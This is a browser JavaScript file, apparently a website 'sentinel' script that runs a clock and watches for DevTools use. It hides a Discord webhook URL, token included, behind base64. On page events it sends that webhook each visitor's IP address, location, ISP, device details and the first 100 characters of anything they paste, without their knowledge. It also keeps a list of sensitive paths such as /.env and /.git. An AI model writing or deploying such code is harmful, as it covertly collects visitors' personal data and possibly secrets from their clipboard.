(function() {
    // core config
    const _wh = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUwNDI0Mzg2OTkwMDk5NjY5OC9RQVlCcGJ1SjA2Zm5QMjFtRVVIWTliYUZqUGFUMEhlWWNiUUJua3h1amdXUXJXWi1kaUlpdzBJaFB4UmJ6a3h6eVFmWQ==';
    const _url = atob(_wh);

    const uiqm = {
        last: 0,
        cooldown: 15000,

        async getInfo() {
            try {
                // Using ipwho.is which has proper CORS headers
                const res = await fetch('https://ipwho.is/').catch(() => null);
                const data = res ? await res.json() : {};
                
                return {
                    ip: data.ip || 'Unknown',
                    loc: data.city ? `${data.city}, ${data.region}, ${data.country}` : 'Unknown',
                    isp: data.connection ? data.connection.isp : 'Unknown',
                    tz: data.timezone ? data.timezone.id : 'Unknown',
                    ua: navigator.userAgent,
                    plat: navigator.platform,
                    cpu: navigator.hardwareConcurrency || 'N/A',
                    mem: navigator.deviceMemory || 'N/A'
                };
            } catch (e) {
                return { ip: 'Error', loc: 'Error', ua: navigator.userAgent };
            }
        },

        async log(type, msg) {
            const now = Date.now();
            if (now - this.last < this.cooldown) return;
            this.last = now;

            const info = await this.getInfo();
            
            const payload = {
                username: "uiqm sentinel",
                embeds: [{
                    title: 'Security Log: ' + type,
                    color: 16711680,
                    fields: [
                        { name: 'Details', value: msg },
                        { name: 'Network', value: `IP: ||${info.ip}||\nLoc: ${info.loc}\nISP: ${info.isp}\nTZ: ${info.tz}` },
                        { name: 'Device', value: `OS: ${info.plat}\nCPU: ${info.cpu} | RAM: ${info.mem}GB\nUA: \`${info.ua}\`` }
                    ],
                    timestamp: new Date().toISOString()
                }]
            };

            await fetch(_url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            }).catch(() => {});
        },

        init() {
            // clock (Passive background task)
            const updateClock = () => {
                const now = new Date();
                const timeStr = now.toLocaleTimeString('en-US', { hour12: true, hour: 'numeric', minute: '2-digit', second: '2-digit' });
                const clockEl = document.getElementById('live-clock');
                if (clockEl) clockEl.innerText = timeStr;
            };
            updateClock();
            setInterval(updateClock, 1000);

            // devtools check (resize only, no debugger)
            let dev = false;
            window.addEventListener('resize', () => {
                const threshold = 160;
                if (window.outerWidth - window.innerWidth > threshold || window.outerHeight - window.innerHeight > threshold) {
                    if (!dev) {
                        this.log('DevTools', 'User resized window (possible devtools)');
                        dev = true;
                    }
                } else {
                    dev = false;
                }
            });

            // paste check
            window.addEventListener('paste', (e) => {
                const data = e.clipboardData.getData('text');
                this.log('Paste Detected', `User pasted: ${data.substring(0, 100)}...`);
            });

            // paths
            const bad = ['/.env', '/package.json', '/config.js', '/.git', '/node_modules', '/api/v1'];
            const p = window.location.pathname.toLowerCase();
            bad.forEach(f => {
                if (p === f || p.startsWith(f + '/') || p.endsWith(f)) {
                    this.log('Forbidden Path', `User probed: ${f}`);
                    window.location.href = 'https://google.com';
                }
            });

            // shortcuts
            window.addEventListener('keydown', (e) => {
                if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) || (e.ctrlKey && e.key === 'U')) {
                    this.log('Shortcut', `Key: ${e.key}`);
                }
            });
        }
    };

    uiqm.init();
    console.log('%c uiqm sentinel active', 'color: cyan; font-weight: bold;');
})();
